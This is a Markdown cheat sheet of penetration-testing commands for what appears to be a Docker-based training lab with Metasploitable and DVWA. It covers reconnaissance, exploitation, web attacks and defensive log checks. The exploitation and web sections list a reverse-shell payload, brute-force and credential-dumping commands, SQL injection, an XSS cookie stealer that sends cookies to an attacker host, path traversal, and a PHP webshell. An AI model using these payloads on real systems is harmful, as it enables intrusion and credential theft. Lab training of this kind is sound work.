# 🎯 M1BLUR Cheat Sheet - Essential Commands

## Day 1 - Reconnaissance
| Command | Usage |
|----------|-------|
| `theHarvester -d target.com -b all` | OSINT: emails + subdomains |
| `nmap -sC -sV -O -p- <IP> -oN scan.txt` | Full scan + save |
| `enum4linux -a <IP>` | SMB enumeration |
| `gobuster dir -u http://<IP> -w common.txt` | Hidden directories |
| `dig axfr <domain> @<IP>` | DNS zone transfer |
| `curl -I http://<IP>` | HTTP headers |
| `nc -v <IP> <PORT>` | Banner grabbing |
| `whatweb http://<IP>` | Web fingerprinting |

## Day 2 - Exploitation
| Command | Usage |
|----------|-------|
| `msfconsole -q` | Start Metasploit |
| `search <cve>` | Search for exploit |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf` | Linux payload |
| `nc -lvnp 4444` | Reverse shell listener |
| `python3 -c 'import pty;pty.spawn("/bin/bash")'` | Stabilize shell |
| `hashcat -m 1000 hashes.txt rockyou.txt` | Crack NTLM |
| `john --format=raw-md5 hashes.txt --wordlist=rockyou.txt` | Crack with John |
| `hydra -l admin -P rockyou.txt ssh://<IP>` | SSH brute force |
| `hydra -L users.txt -P pass.txt ftp://<IP>` | FTP brute force |
| `psexec.py -hashes :HASH admin@<IP>` | Pass-the-Hash |
| `find / -perm -4000 2>/dev/null` | SUID binaries Linux |
| `sudo -l` | Check sudoers |
| `meterpreter> getsystem` | Windows PrivEsc |
| `load kiwi ; creds_all` | Mimikatz |

## Day 3 - Web Attacks
| Command | Usage |
|----------|-------|
| `nikto -h http://<IP>` | Web vulnerability scan |
| `' OR 1=1 -- -` | SQLi test |
| `sqlmap -u "http://<IP>/page.php?id=1" --dump` | Automated SQLMap |
| `sqlmap -r req.txt --dump` | SQLMap with request |
| `<script>document.location='http://<Kali>/?c='+document.cookie</script>` | XSS cookie stealer |
| `../../../etc/passwd` | LFI path traversal |
| `<?php system($_GET['cmd']); ?>` | Minimal webshell |
| `ffuf -u http://<IP>/FUZZ -w common.txt` | Directory fuzzing |

## Day 4 - Defense
| Command | Usage |
|----------|-------|
| `sudo tcpdump -i any -w capture.pcap` | Network capture |
| `wireshark capture.pcap` | PCAP analysis |
| `find / -mtime -1 -ls 2>/dev/null` | Files modified in last 24h |
| `ss -tulpn` | Active connections |
| `last -a | head -20` | Last logins |
| `grep "Failed password" /var/log/auth.log` | Failed SSH attempts |
| `journalctl -u ssh --since "1 hour ago"` | Recent SSH logs |
| `lynis audit system` | Security audit |

## Utilities
| Command | Usage |
|----------|-------|
| `docker exec -it m1blur-metasploitable /bin/bash` | Shell into target |
| `docker exec -it m1blur-dvwa /bin/bash` | Shell into DVWA |
| `docker logs m1blur-metasploitable` | Container logs |
| `docker compose -f docker/docker-compose.yml logs -f` | Real-time logs |
| `python3 -m http.server 80` | Simple HTTP server |
| `nc -lvnp 4444` | Netcat listener |
